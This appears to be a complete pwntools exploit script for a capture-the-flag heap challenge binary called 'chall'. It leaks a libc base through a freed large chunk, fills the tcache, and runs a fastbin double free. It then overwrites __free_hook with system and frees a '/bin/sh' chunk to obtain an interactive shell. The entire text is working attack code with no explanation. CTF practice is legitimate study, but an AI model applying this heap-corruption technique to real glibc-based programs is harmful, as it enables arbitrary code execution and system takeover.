from pwn import *

e = ELF('./chall')
p = process('./chall')
libc = e.libc
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)

table = 0x0000000000202060

def add(size,name,call):
	sla(':','1')
	sla("Please input the size of girl's name",str(size))
	sa('please inpute her name:',name)
	sa('please input her call:',call)

def show(idx):
	sla(':','2')
	sla('Please input the index:',str(idx))

def free(idx):
	sla(':','4')
	sla(':',str(idx))

add(0x420,'A'*4,'B'*4) # 0
add(0x20,'A'*4,'B'*4) # 1
free(0)
show(0)
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info(hex(leak))
libc_base = leak - 0x1e4ca0
log.info(hex(libc_base))

for i in range(9): # 2 3 4 5 6 7 8 9 10
	add(0x68,'A','B')

for j in range(2,9):
	free(j)

free(9)
free(10)
free(9)

for i in range(7):
	add(0x60,'A','B') # 11 12 13 14 15 16 17

add(0x68,p64(libc_base + libc.symbols['__free_hook']),'C') # 18
add(0x68,'A','B') # 19
add(0x68,'A','B') # 20
add(0x68,p64(libc_base + libc.symbols['system']),'D') # 21

add(0x20,'/bin/sh\x00','C') # 22

free(22)

p.interactive()
